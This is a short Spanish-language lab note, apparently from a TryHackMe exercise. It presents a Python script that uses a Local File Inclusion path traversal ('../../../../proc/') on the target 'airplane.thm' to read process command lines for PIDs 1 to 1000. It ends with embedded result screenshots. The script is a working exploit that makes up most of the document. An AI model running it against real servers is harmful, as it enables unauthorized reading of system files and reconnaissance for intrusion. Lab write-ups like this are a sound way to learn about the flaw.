El script `LFI.py` es un programa en Python diseñado para realizar un ataque de Local File Inclusion (LFI) en un servidor web. El propósito del script es leer los nombres de procesos del sistema de archivos `/proc` de un servidor Unix y guardarlos en un archivo de texto.

```Python
import requests
import string

base_url = "http://airplane.thm:8000/?page="
file_path_template = "../../../../proc/"
output_file = "process.txt"

def fetch_proc_entry(entry):
    url = base_url + file_path_template + str(entry) + "/cmdline"
    try:
        response = requests.get(url)
        # Verificar si la solicitud fue exitosa y no devuelve "Page not found"
        if response.status_code == 200 and "Page not found" not in response.text:
            return response.text
        else:
            return None
    except requests.RequestException as e:
        print(f"Error fetching entry {entry}: {e}")
        return None

def filter_non_printable(text):
    # Filtrar caracteres no imprimibles
    return ''.join(filter(lambda x: x in string.printable, text))

# Abrir el archivo de salida en modo escritura
with open(output_file, "w") as file:
    # Iterar sobre los posibles IDs de proceso (del 1 al 1000)
    for i in range(1, 1001):
        proc_name = fetch_proc_entry(i)
        if proc_name:
            clean_proc_name = filter_non_printable(proc_name).strip()
            if clean_proc_name:
                file.write(f"Entry {i}: {clean_proc_name}\n")
                print(f"Entry {i}: {clean_proc_name}")

# Informar al usuario que los nombres de proceso se han guardado correctamente
print(f"Process names have been saved to {output_file}")

```

## Resultado
![[Pasted image 20240613085057.png]]
![[Pasted image 20240613085133.png]]

